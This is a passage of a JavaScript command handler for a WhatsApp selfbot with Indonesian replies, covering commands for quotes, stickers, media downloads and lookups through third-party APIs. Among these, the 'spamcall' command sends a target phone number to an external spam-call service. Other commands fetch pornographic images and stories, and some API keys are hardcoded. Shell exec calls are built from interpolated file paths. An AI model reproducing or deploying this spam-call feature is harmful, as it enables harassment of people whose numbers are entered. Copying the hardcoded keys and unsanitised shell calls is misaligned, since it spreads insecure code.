                    break
               case 'motivasi':
                    anu = await fetchJson(`https://h4ck3rs404-api.herokuapp.com/api/motivasi?apikey=404Api`)
                    teks = `❝${anu.result}❞`
                    reply(teks)
                    break
               case 'katasenja':
                    anu = await fetchJson(`https://h4ck3rs404-api.herokuapp.com/api/katasenja?apikey=404Api`)
                    teks = `❝${anu.result}❞`
                    reply(teks)
                    break
               case 'quotesanime':
                    quotes = await fetchJson(`http://api.lolhuman.xyz/api/random/quotesnime?apikey=${lol}`)
                    quotes = quotes.result
                    quote = quotes.quote
                    char = quotes.character
                    anime = quotes.anime
                    episode = quotes.episode
                    reply(`_❝${quote}❞_\n\n*― ${char}*\n*― ${anime} ${episode}*`)
                    break
               case 'jadwalsholat':
                    if (yanz.length < 1) return reply('Daerah mana bang?')
                    jsholat = body.slice(14)
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${jsholat}?apikey=${lol}`, {method: 'get'})
                    teks = `*Jadwal Sholat*\nWilayah _*${anu.result.wilayah}*_ dan sekitarnya\n${anu.result.tanggal}\n\n● *Wilayah :* ${anu.result.wilayah}\n● *Imsak :* ${anu.result.imsak}\n● *Subuh :* ${anu.result.subuh}\n● *Terbit :* ${anu.result.terbit}\n● *Dhuha :* ${anu.result.dhuha}\n● *Dzuhur :* ${anu.result.dzuhur}\n● *Ashar :* ${anu.result.ashar}\n● *Maghrib* : ${anu.result.maghrib}\n● *Isya :* ${anu.result.isya}\n\n_*ᴊᴀᴅᴡᴀʟ ꜱʜᴏʟᴀᴛ*_`
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(teks, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'newsinfo':
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/newsinfo?apikey=${lol}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Author : ${x.author}\n`
                        ini_txt += `Source : ${x.source.name}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Published : ${x.publishedAt}\n`
                        ini_txt += `Description : ${x.description}\n\n`
                    }
                    reply(ini_txt)
                    break
               case 'cersex':
                    anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/cersex?apikey=OneDayOneCharity`)
                    buff = await getBuffer(anu.gambar)
                    teks = `${anu.result}`
                    riyan.sendMessage(from, buff, image, {quoted: yan, caption: teks})
                    break
               case 'google':
                    if (yanz.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = yanz.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/gsearch?apikey=${lol}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Google Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Desc : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
               case 'covid':
                    anu = await fetchJson(`https://lindow-api.herokuapp.com/api/covidindo?apikey=${apilin}`)
                    teks = `Covid Negara *Indonesia*\n\n● *Positif :* ${anu.result.positif}\n● *Sembuh :* ${anu.result.sembuh}\n● *Dirawat :* ${anu.result.dirawat}\n● *Meninggal :* ${anu.result.meninggal}\n\nTetap *#Stay At Home*\nPatuhi protokol Kesehatan`
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(teks, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'bokep':
                    const mskkntl = fs.readFileSync('./src/18.json')
                    const kntlnya = JSON.parse(mskkntl)
                    const rindBkp = Math.floor(Math.random() * kntlnya.length)
                    const rindBkep = kntlnya[rindBkp]
                    const lai = await getBuffer(rindBkep.image)
                    riyan.sendMessage(from, lai, image ,{quoted: yan, caption: rindBkep.teks, quoted:yan})
                    break
               case 'asupan':
                    anu = await getBuffer(`https://lindow-api.herokuapp.com/api/asupan?apikey=${apilin}`)
                    riyan.sendMessage(from, anu, video, {quoted: yan, caption: 'Jan buat bacol ya:v'})
                    break
               case 'ssweb':
                    if (yanz.length < 1) return reply('Linknya mana??')
                    web = body.slice(7)
                    anu = await fetchJson(`https://naufalhoster.xyz/tools/ssweb?apikey=${nopal}&url=${web}`)
                    buff = await getBuffer(anu.result.image)
                    riyan.sendMessage(from, buff, image, {quoted: yan, caption: `Tah ajg:v`})
                    break
               case 'imgbb':
                    var imgbb = require('imgbb-uploader')
                    enmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(enmedia)
                    anu = await imgbb(`${apgb}`, media)
                    teks = `${anu.display_url}`
                    reply(teks)
                    fs.unlinkSync(media)
                    break
               case 'memegen':
                    nn = body.slice(9)
                    atas = nn.split("|")[0];
                    bawah = nn.split("|")[1];
                    imgbb = require('imgbb-uploader')
                    enmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(enmedia)
                    anu = await imgbb(`${apgb}`, media)
                    buff = await getBuffer(`http://api.lolhuman.xyz/api/memegen?apikey=${lol}&texttop=${atas}&textbottom=${bawah}&img=${anu.display_url}`)
                    riyan.sendMessage(from, buff, image, {caption: `Dah jadi beb`, quoted: yan})
                    fs.unlinkSync(media)
                    break
               case 'spamcall':
                    if (yanz.length < 1) return reply(`Contoh :\n${prefix}spamcall 6285791458996`)
                    call = `${body.slice(12)}`
                    anu = await fetchJson(`https://lindow-python-api.herokuapp.com/api/spamcall?no=${call}`, {method: 'get'})
                    riyan.sendMessage(from, `${anu.logs}`, text, {quoted: yan})
                    break
               case 'quotemaker':
                    qt = body.slice(12)
                    anu = await getBuffer(`http://api.lolhuman.xyz/api/quotemaker?apikey=${lol}&text=${qt}`)
                    riyan.sendMessage(from, anu, image, {quoted: yan, caption: 'Dah jadi beb'})
                    break
               case 'readqrcode':
                    imgbb = require('imgbb-uploader')
                    enmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(enmedia)
                    anu = await imgbb(`${apgb}`, media)
                    cuk = await fetchJson(`http://api.lolhuman.xyz/api/read-qr?apikey=${lol}&img=${anu.display_url}`)
                    teks = `${cuk.result}`
                    reply(teks)
                    fs.unlinkSync(media)
                    break
               case 'wasted':
                    imgbb = require('imgbb-uploader')
                    enmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(enmedia)
                    anu = await imgbb(`${apgb}`, media)
                    buff = await getBuffer(`https://naufalhoster.xyz/textmaker/gta?apikey=${nopal}&url=${anu.display_url}`)
                    riyan.sendMessage(from, buff, image, {quoted: yan})
                    fs.unlinkSync(media)
                    break
               case 'pornhublog':
                    pg = body.slice(12)
                    var kanan = pg.split("|")[0];
                    var kiri = pg.split("|")[1];
                    anu = await getBuffer(`https://naufalhoster.xyz/textmaker/pornhub?apikey=${nopal}&text1=${kanan}&text2=${kiri}`)
                    riyan.sendMessage(from, anu, image, {quoted: yan, caption: `Dah jadi beb..`})
                    break
               case 'trigger':
                    var imgbb = require('imgbb-uploader')
                    if (((isMedia && !yan.message.videoMessage) || isQuotedImage) && yanz.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(yan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : yan
                    owgi = await riyan.downloadAndSaveMediaMessage(ger)
                    anu = await imgbb(`${apgb}`, owgi)
                    teks = `${anu.display_url}`
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
                    exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                     fs.unlinkSync(ranp)
                     if (err) return reply(mess.error.stick)
                     nobg = fs.readFileSync(rano)
                     riyan.sendMessage(from, nobg, sticker, { quoted: yan })
                     fs.unlinkSync(rano)
                     })
                     }
                     fs.unlinkSync(owgi)
                    break
               case 'ocr':
                    if ((isMedia && !yan.message.videoMessage || isQuotedImage) && yanz.length == 0) {
                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    const media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
                    .then(teks => {
                    reply(teks.trim())
                    fs.unlinkSync(media)
                    })
                    .catch(err => {
                    reply(err.message)
                    fs.unlinkSync(media)
                    })
                    } else {
                    reply(`Kirim foto lalu reply dengan ${prefix}ocr`)
                    }
                    break
               case 'stiker':
               case 's':
               case 'sticker':
               case 'stickergif':
               case 'stikergif':
                    if ((isMedia && !yan.message.videoMessage || isQuotedImage) && yanz.length == 0) {
                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    const media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ran = getRandom('.webp')
                    await ffmpeg(`./${media}`)
                    .input(media)
                    .on('start', function (cmd) {
                    console.log(`Started : ${cmd}`)
                    })
                    .on('error', function (err) {
                    console.log(`Error : ${err}`)
                    fs.unlinkSync(media)
                    reply(mess.error.stick)
                    })
                    .on('end', function () {
                    console.log('Finish')
                    riyan.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: freply})
                    fs.unlinkSync(media)
                    fs.unlinkSync(ran)
                    })
                    .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                    .toFormat('webp')
                    .save(ran)
                    } else if ((isMedia && yan.message.videoMessage.seconds < 11 || isQuotedVideo && yan.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && yanz.length == 0) {
                    const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    const media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ran = getRandom('.webp')
                    fakestatus('Wait...', `Yanz Selfbot!`, text, fakethumb)
                    await ffmpeg(`./${media}`)
                    .inputFormat(media.split('.')[1])
                    .on('start', function (cmd) {
                    console.log(`Started : ${cmd}`)
                    })
                    .on('error', function (err) {
                    console.log(`Error : ${err}`)
                    fs.unlinkSync(media)
                    tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                    reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
                    })
                    .on('end', function () {
                    console.log('Finish')
                    buff = fs.readFileSync(ran)
                    riyan.sendMessage(from, buff, sticker, {quoted: freply})
                    fs.unlinkSync(media)
                    fs.unlinkSync(ran)
                    })
                    .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                    .toFormat('webp')
                    .save(ran)
                    }
                    break
               case 'ttp': //By LINDOW
                    pngttp = './sticker/ttp.png'
                    webpng = './sticker/ttp.webp'
                    const ttptext = body.slice(5)
                    fetch(`https://api.areltiyan.site/sticker_maker?text=${encodeURIComponent(ttptext)}`, { method: 'GET'})
                    .then(async res => {
                    const ttptxt = await res.json()
                    base64Img.img(ttptxt.base64, 'sticker', 'ttp', function(err, filepath) {
                    if (err) return console.log(err);
                    console.log('Success Create TtpWm By Yanz!')
                    exec(`ffmpeg -i ${pngttp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${webpng}`, (err) => {
                    exec(`webpmux -set exif ./sticker/WmYanz.exif ${webpng} -o ${webpng}`, async (error) => {
                    buffer = fs.readFileSync(webpng)
                    riyan.sendMessage(from, buffer, sticker, {quoted: freply})
                    fs.unlinkSync(webpng)
                    fs.unlinkSync(pngttp)
                         })
                         })
                         })
                         });
                    break
               case 'attp':
                    ini = yanz.join(" ")
                    buff = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(ini)}`)
                    riyan.sendMessage(from, buff, sticker, {quoted: freply})
                    break
               case 'swm':
               case 'stickerwm':
               case 'swmgif':
               case 'stickerwmgif':
                    if ((isMedia && !yan.message.videoMessage || isQuotedImage) && yanz.length == 0) {
                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    const media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ran = getRandom('.webp')
                    await ffmpeg(`./${media}`)
                    .input(media)
                    .on('start', function (cmd) {
                    })
                    .on('error', function (err) {
                    console.log(`Error : ${err}`)
                    fs.unlinkSync(media)
                    reply(mess.error.stick)
                    })
                    .on('end', function () {
                    console.log('Success Create StickerWm By Yanz!')
                    exec(`webpmux -set exif ./sticker/WmYanz.exif ${ran} -o ${ran}`, async (error) => {
                    riyan.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: freply})
                    fs.unlinkSync(media)
                    fs.unlinkSync(ran)
                    })})
                    .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                    .toFormat('webp')
                    .save(ran)
                     } else if ((isMedia && yan.message.videoMessage.seconds < 11 || isQuotedVideo && yan.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && yanz.length == 0) {
                    const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    const media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ran = getRandom('.webp')
                    fakestatus('Wait...', `Yanz Selfbot!`, text, fakethumb)
                    await ffmpeg(`./${media}`)
                    .inputFormat(media.split('.')[1])
                    .on('error', function (err) {
                    console.log(`Error : ${err}`)
                    fs.unlinkSync(media)
                    tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                    reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
                    })
                    .on('end', function () {
                    console.log('Success Create StickerWmGif By Yanz!')
                    exec(`webpmux -set exif ./sticker/WmYanz.exif ${ran} -o ${ran}`, async (error) => {
                    buff = fs.readFileSync(ran)
                    riyan.sendMessage(from, buff, sticker, {quoted: freply})
                    fs.unlinkSync(media)
                    fs.unlinkSync(ran)
                    })})
                    .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                    .toFormat('webp')
                    .save(ran)
                    }
                    break
               case 'swmcostum':
                    sm = body.slice(11)
                    var author = sm.split("|")[0];
                    var name = sm.split("|")[1];
                    var Exif = require(process.cwd() + '/exif.js')
                    var exif = new Exif()
                    var stickerWm = (media, packname, author) => {
                    ran = getRandom('.webp')
                    exif.create(packname, author, from.split("@")[0])
                    exec(`webpmux -set exif ./sticker/${from.split("@")[0]}.exif ./${media} -o ./${ran}`, (err, stderr, stdout) => {
                    if (err) return riyan.sendMessage(from, String(err), text, { quoted: yan })
                    riyan.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: freply})
                    })
                    }
                    if ((isMedia && !yan.message.imageMessage || isQuotedImage)) {
                    var mediaEncrypt = isQuotedImage ? JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : yan
                    var mediaFinalys = await riyan.downloadAndSaveMediaMessage(mediaEncrypt, './sticker/dlstikerwm')
                    var has = `${author}` // Author Name
                    var kas = `${name}` // Pack Name
                    var packageName = `${has}`
                    var packageAuthor = `${kas}`
                    var exifName = './sticker/stikerwm.exif',
                    webpName = `./sticker/${from.split(/@/)[0]}.webp`
                    try {
                     exec(`cwebp -q 50 ./sticker/dlstikerwm.jpeg -o ${webpName}`, (e, stderr, stdout) => {
                       if (e) return riyan.sendMessage(from, String(stderr), text)
                           stickerWm(webpName, packageName, packageAuthor)
                     })
                     } catch (e) {
                      throw e
                     }
                    }
                    break
               case 'takestick':
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    anu = yanz.join(' ').split('|')
                    var kls = body.slice(11)
                    var has = kls.split("|")[0];
                    var kas = kls.split("|")[1];
                    satu = anu[0] !== '' ? anu[0] : `${has}`
                    dua = typeof anu[1] !== 'undefiened' ? anu[1] : `${kas}`
                    require('./lib/exif.js').createExif(satu, dua)
                    require('./lib/exif.js').modStick(media, riyan, yan, from)
                    break
               case 'exif':
                    var Exif = require(process.cwd() + '/exif.js')
                    var exif = new Exif();
                    if (yanz.length < 1) return reply(`Penggunaan ${prefix}exif exifName|nama|author`)
                    exif.create(q.split('|')[1], q.split('|')[2], q.split("|")[0])
                    fakestatus('Succes Create Exif', `Yanz Selfbot!`, text, fakethumb)
                    break
               case 'tovid':
                    if (!isQuotedSticker) return reply('Reply stiker nya')
                    var imgbb = require('imgbb-uploader')
                    if (yan.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
                    const encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    const media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    const upload = await imgbb(`${apgb}`, media)
                    const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.display_url}`)
                    const buff = await getBuffer(rume.data.result)
                    riyan.sendMessage(from, buff, video, {quoted: yan})
                    fs.unlinkSync(media)
                    }
                    break
               case 'tomp3':
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ran = getRandom('.mp4')
                    exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
                    buffer = fs.readFileSync(ran)
                    riyan.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: yan})
                    fs.unlinkSync(ran)
                    })
                    break
               case 'getpp':
                    if (yan.message.extendedTextMessage === undefined || yan.message.extendedTextMessage === null) return reply('Tag cvk')
                    mentioned = yan.message.extendedTextMessage.contextInfo.mentionedJid[0]
                    try {
                    pp = await riyan.getProfilePicture(`${mentioned.split('@')[0]}@c.us`)
                    buffer = await getBuffer(pp)
                    } catch {
                    buffer = fs.readFileSync('./strg/image/kosong.jpg')
                    }
                    riyan.sendMessage(from, buffer, image, {quoted: yan, caption: `Foto Profile @${mentioned.split("@")[0]}`, contextInfo:{"mentionedJid": [mentioned]}})
                    break
               case 'getbio':
                    if (yan.message.extendedTextMessage === undefined || yan.message.extendedTextMessage === null) return reply('Tag cvk')
                    mentioned = yan.message.extendedTextMessage.contextInfo.mentionedJid[0]
                    bio = await riyan.getStatus(mentioned, MessageType.text)
                    riyan.sendMessage(from, bio.status, text, {quoted: yan})
                    if (bio.status == 401) {
                    reply("Status Profile Not Found")
                    }
                    break
               case 'getname':
                    if (yan.message.extendedTextMessage === undefined || yan.message.extendedTextMessage === null) return reply('Tag cvk')
                    mentioned = yan.message.extendedTextMessage.contextInfo.mentionedJid[0]
                    getUserName = async(mentioned) => {
                    user = riyan.contacts[mentioned]
                    return user != undefined ? user.notify : ""
                    }
                    username = await getUserName(mentioned)
                    riyan.sendMessage(from, `${username}`, text, {quoted: yan})
                    break
               case 'tts':
                    const gtts = require('./lib/gtts')(yanz[0])
                    if (yanz.length < 2) return riyan.sendMessage(from, `Textnya mana om?\nKalo kesulitan cari kode bahasa ketik *${prefix}bahasa*\nContoh : ${prefix}tts id Hai`, text, {quoted: yan})
                    dtt = body.slice(8)
                    ranm = getRandom('.mp3')
                    rano = getRandom('.ogg')
                    dtt.length > 600
                    ? reply('Textnya kebanyakan om')
                    : gtts.save(ranm, dtt, function() {
                    exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                    fs.unlinkSync(ranm)
                    buffer = fs.readFileSync(rano)
                    if (err) return reply('Gagal om:(')
                    riyan.sendMessage(from, buffer, audio, {quoted: yan, ptt:true})
                    fs.unlinkSync(rano)
                         })
                    })
                    break
               case 'shortlink':
                    ini_link = yanz[0]
                    ini_buffer = await fetchJson(`https://lindow-api.herokuapp.com/api/short/tiny?url=${ini_link}&apikey=${apilin}`)
                    reply(ini_buffer.result.link)
                    break
               case 'bahasa':
                    riyan.sendMessage(from, bahasa(prefix, sender), text, {quoted: yan})
                    break
               case 'setprefix':
                    if (yanz.length == 0) return reply('Prefixnya?')
                    prefix = yanz[0]
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*Succes change prefix to : ${prefix}*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'darkjoke':
                    data = await fetchJson(`https://api.zeks.xyz/api/darkjokes?apikey=${apiZeks}`)
                    dark = data.result
                    thumb = await getBuffer(dark)
                    riyan.sendMessage(from, thumb, image, {quoted: yan})
                    break
               case 'memeind':
                    data = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=${apiZeks}`)
                    dark = data.result
                    thumb = await getBuffer(dark)
                    riyan.sendMessage(from, thumb, image, {quoted: yan})
                    break
               case 'ytmp3':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*Wait...*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    data = await fetchJson(`http://api.lolhuman.xyz/api/ytaudio?apikey=${lol}&url=${body.slice(7)}`)
                    shortt = await fetchJson(`https://naufalhoster.xyz/tools/tinyurl?apikey=${nopal}&url=${data.result.link[0].link}`, {method: 'get'})
                    if (Number(data.result.link[0].size.split(' MB')[0]) >= 30.00) return reply(`*Data Berhasil Didapatkan!*\n\n*Title :* ${data.result.title}\n*Uploader :* ${data.result.uploader}\n\n*Duration :* ${data.result.duration}\n*View :* ${data.result.view}\n*Like :* ${data.result.like}\n*Dislike :* ${data.result.dislike}\n\n*Filesize* : ${data.result.link[0].size}\n\n*Link* : ${shortt.result.shortUrl}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                    teks = `*YTMP3 DOWNLOADER*\n\n*Title :* ${data.result.title}\n*Uploader :* ${data.result.uploader}\n\n*Duration :* ${data.result.duration}\n\n*Bitrate :* ${data.result.link[0].bitrate}\n*Size :* ${data.result.link[0].size}\n\nWait a minute, sending audio..`
                    get = await getBuffer(data.result.thumbnail)
                    riyan.sendMessage(from, get, image, {quoted: yan, caption: teks})
                    buff = await getBuffer(data.result.link[0].link)
                    riyan.sendMessage(from, buff, audio, {mimetype: 'audio/mp4', filename: `${data.result.title}.mp3`, quoted: yan})
                    break
               case 'ytmp4':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*Wait...*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    data = await fetchJson(`http://api.lolhuman.xyz/api/ytvideo?apikey=${lol}&url=${body.slice(7)}`)
                    if (Number(data.result.link[0].size.split(' MB')[0]) >= 40.00) return reply(`*Data Berhasil Didapatkan!*\n\n*Title :* ${data.result.title}\n*Uploader :* ${data.result.uploader}\n\n*Duration :* ${data.result.duration}\n*View :* ${data.result.view}\n*Like :* ${data.result.like}\n*Dislike :* ${data.result.dislike}\n\n*Filesize* : ${data.result.link[0].size}\n\n*Link* : ${data.result.link[0].link}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                    teks = `*YTMP4 DOWNLOADER*\n\n*Title :* ${data.result.title}\n*Uploader :* ${data.result.uploader}\n\n*Duration :* ${data.result.duration}\n\n*Resolution :* ${data.result.link[0].resolution}\n*Size :* ${data.result.link[0].size}\n\nWait a minute, sending vidio...`
                    get = await getBuffer(data.result.thumbnail)
                    riyan.sendMessage(from, get, image, {quoted: yan, caption: teks})
                    buff = await getBuffer(data.result.link[0].link)
                    riyan.sendMessage(from, buff, video, {mimetype: 'video/mp4', filename: `${data.result.title}.mp4`, quoted: yan, caption: `${data.result.title}`})
                    break
               case 'tiktok':
               case 'tiktokdl':
                    if (yanz.length < 1) return reply('Urlnya mana?')
                    fakestatus(`*Wait...*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
                    url = yanz[0]
                    anu = await fetchJson(`https://api.xteam.xyz/dl/tiktok?url=${url}&APIKEY=${apixt}`)
                    result = anu.info
                    buf = await getBuffer(`${anu.server_1}`)
                    teks = `_*Tiktok Downloader*_\n
*Username :* ${result[0].authorMeta.name}
*Nickname :* ${result[0].authorMeta.nickName}\n
*Ratio :* ${result[0].videoMeta.ratio}
*Durasi :* ${result[0].videoMeta.duration} _detik_
*Music :* ${result[0].musicMeta.musicName}
*Caption :* ${result[0].text}`
                    riyan.sendMessage(from, buf, video, {quoted: yan, caption: teks})
                    break
               case 'tiktok2':
                    if (yanz.length < 1) return reply('Urlnya mana?')
                    fakestatus(`*Wait...*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
                    anu = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lol}&url=${yanz[0]}`)
                    result = anu.result
                    teks = `_*Tiktok Downloader*_\n
*Username :* ${result.author.username}
*Nickname :* ${result.author.nickname}\n
*Caption :* ${result.title}
*Durasi :* ${result.duration} _detik_`
                    vid = await getBuffer(result.link)
                    riyan.sendMessage(from, vid, video, {quoted: yan, caption: teks})
                    break
               case 'instagram':
                    if (yanz.length < 1) return reply('Urlnya mana?')
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*Wait...*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    url = yanz[0]
                    ini_url2 = await fetchJson(`https://lindow-api.herokuapp.com/api/igdl?link=${url}&apikey=${apilin}`)
                    ini_url = ini_url2.result.url
                    ini_type = image
                    if (ini_url.includes(".mp4")) ini_type = video
                    buffer = await getBuffer(ini_url)
                    riyan.sendMessage(from, buffer, ini_type, { quoted: yan, caption: `*Succes download..*`  })
                    break
               case 'igdl':
                    if (yanz.length < 1) return reply('Urlnya mana?')
                    url = yanz[0]
                    fakestatus(`*Wait...*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
                    fet = await fetchJson(`https://lindow-api.herokuapp.com/api/instagram?link=${url}&apikey=${apilin}`)
                    resu = fet.result
                    for (let i = 0; i < fet.result.length; i++) {
                    iniUr = resu[i].url
                    buff = await getBuffer(resu[i].url)
                    typei = image
                    if (iniUr.includes(".mp4")) typei = video
                    riyan.sendMessage(from, buff, typei, {quoted: yan})
                    }
                    break
               case 'semoji':
                    if (yanz.length == 0) return reply(`Usage: ${prefix + command} emoji\nExample: ${prefix + command} 😭`)
                    emoji = yanz[0]
                    try {
                        emoji = encodeURI(emoji[0])
                    } catch {
                        emoji = encodeURI(emoji)
                    }
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${lol}`)
                    riyan.sendMessage(from, buffer, sticker, { quoted: yan })
                    break
               case 'tiktokmusic':
               case 'musictiktok':
                    if (yanz.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    if (yanz[0] === 'audio') {
                    ini_link = yanz[1]
                    get_audio = await getBuffer(`http://api.lolhuman.xyz/api/tiktokmusic?apikey=${lol}&url=${ini_link}`)
                    riyan.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: yan })
                    } if (yanz[0] === 'ptt') {
                    ini_link = yanz[1]
                    get_audio = await getBuffer(`http://api.lolhuman.xyz/api/tiktokmusic?apikey=${lol}&url=${ini_link}`)
                    riyan.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', quoted: yan, ptt: true })
                    }
                    break
               case 'setreply':
                    riyan.updatePresence(from, Presence.composing)
                    if (yanz.length < 1) return
                    cr = body.slice(10)
                    reply(`reply berhasil di ubah menjadi : ${cr}`)
                    break 
               case 'carbon':
                    if (yanz.length < 1)return reply('Sertakan teks nya')
                    targed = yan.participant
                    teks = body.slice(8)
                    drc = await getBuffer(`https://carbonnowsh.herokuapp.com/?code=${teks}`)
                    riyan.sendMessage(from, drc, image, {quoted: yan})
                    break
               case 'tagall':
                    jancuk = body.slice(8)
                    members_id = []
                    teks = (yanz.length > 0) ? body.slice(8).trim() : ''
                    teks += `\n\n`
                    for (let mem of groupMembers) {
                    teks += `| • @${mem.jid.split('@')[0]}\n`
                    members_id.push(mem.jid)
                    }
                    mentions(teks.trim(), members_id, true)
                    break
               case 'clearall':
